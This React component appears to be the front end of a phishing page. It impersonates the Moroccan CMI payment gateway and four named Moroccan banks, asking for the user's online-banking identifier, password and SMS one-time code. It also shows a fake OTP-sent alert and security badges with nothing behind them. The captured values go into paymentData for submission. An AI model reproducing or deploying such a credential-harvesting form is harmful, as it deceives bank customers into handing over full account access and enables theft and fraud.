import React, { useState } from 'react';

const CMIForm = ({ paymentData, setPaymentData, onSubmit }) => {
  const [selectedBank, setSelectedBank] = useState('cih');

  const banks = [
    { id: 'cih', name: 'CIH Bank', type: 'Particuliers', color: '#E6F1FB', textColor: '#0C447C' },
    { id: 'attijari', name: 'Attijariwafa', type: 'Particuliers', color: '#FCEBEB', textColor: '#791F1F' },
    { id: 'bp', name: 'Banque Populaire', type: 'Particuliers', color: '#EAF3DE', textColor: '#27500A' },
    { id: 'boa', name: 'Bank of Africa', type: 'Particuliers', color: '#FAEEDA', textColor: '#633806' }
  ];

  const handleBankSelect = (bankId) => {
    setSelectedBank(bankId);
    setPaymentData(prev => ({ ...prev, bank: bankId }));
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setPaymentData(prev => ({ ...prev, [name]: value }));
  };

  const handleRequestOTP = () => {
    alert('Code OTP envoyé par SMS');
  };

  return (
    <div className="payment-method-content">
      <div className="cmi-header">
        <div className="cmi-logo">
          <div className="cmi-bars">
            <div className="bar1"></div>
            <div className="bar2"></div>
            <div className="bar3"></div>
          </div>
        </div>
        <div>
          <div className="cmi-title">CMI — Centre Monétique Interbancaire</div>
          <div className="cmi-subtitle">Paiement bancaire sécurisé au Maroc</div>
        </div>
      </div>

      <div className="redirect-notice">
        <div className="info-icon">
          <svg width="10" height="10" viewBox="0 0 10 10" fill="#fff">
            <circle cx="5" cy="3" r="1"/>
            <rect x="4" y="5" width="2" height="4" rx="1"/>
          </svg>
        </div>
        <div className="notice-text">
          Vous allez être authentifié via votre <strong>banque marocaine</strong>. 
          Saisissez votre identifiant et mot de passe bancaire. Aucun numéro de carte requis.
        </div>
      </div>

      <div className="section-label">Choisissez votre banque</div>
      <div className="bank-grid">
        {banks.map(bank => (
          <div 
            key={bank.id}
            className={`bank-item ${selectedBank === bank.id ? 'selected' : ''}`}
            onClick={() => handleBankSelect(bank.id)}
          >
            <div className={`bank-dot ${selectedBank === bank.id ? 'selected' : ''}`}></div>
            <div className="bank-icon" style={{ background: bank.color }}>
              <span style={{ color: bank.textColor, fontSize: '9px', fontWeight: 500 }}>
                {bank.id === 'cih' ? 'CIH' : bank.id === 'attijari' ? 'ATW' : bank.id === 'bp' ? 'BP' : 'BMCE'}
              </span>
            </div>
            <div>
              <div className="bank-name">{bank.name}</div>
              <div className="bank-type">{bank.type}</div>
            </div>
          </div>
        ))}
      </div>

      <div className="section-label">Authentification bancaire</div>
      
      <form onSubmit={(e) => { e.preventDefault(); onSubmit(); }}>
        <div className="form-group">
          <label className="form-label">Identifiant bancaire ({banks.find(b => b.id === selectedBank)?.name})</label>
          <input
            type="text"
            name="bankIdentifier"
            className="form-input"
            placeholder="Votre identifiant en ligne"
            onChange={handleChange}
          />
        </div>

        <div className="form-group">
          <label className="form-label">Mot de passe</label>
          <input
            type="password"
            name="bankPassword"
            className="form-input"
            placeholder="••••••••"
            onChange={handleChange}
          />
        </div>

        <div className="form-group">
          <label className="form-label">Code OTP (envoyé par SMS)</label>
          <div className="otp-row">
            <input
              type="text"
              name="otpCode"
              className="form-input"
              placeholder="Entrez le code reçu"
              onChange={handleChange}
            />
            <button type="button" className="otp-btn" onClick={handleRequestOTP}>
              Recevoir le code
            </button>
          </div>
        </div>

        <button type="submit" className="pay-btn cmi-pay-btn">
          Confirmer le paiement — 150.00 MAD
        </button>

        <div className="secure-badges">
          <div className="badge">
            <svg className="badge-icon" viewBox="0 0 16 16">
              <rect x="3" y="7" width="10" height="8" rx="2"/>
              <path d="M5 7V5a3 3 0 0 1 6 0v2"/>
            </svg>
            SSL 256-bit
          </div>
          <div className="badge">
            <svg className="badge-icon" viewBox="0 0 16 16">
              <path d="M8 2L3 4v5c0 3 2.5 5 5 6 2.5-1 5-3 5-6V4z"/>
            </svg>
            3D Secure
          </div>
          <div className="badge">
            <svg className="badge-icon" viewBox="0 0 16 16">
              <circle cx="8" cy="8" r="6"/>
              <path d="M6 8l2 2 3-3"/>
            </svg>
            Bank Agréée
          </div>
        </div>
      </form>
    </div>
  );
};

export default CMIForm;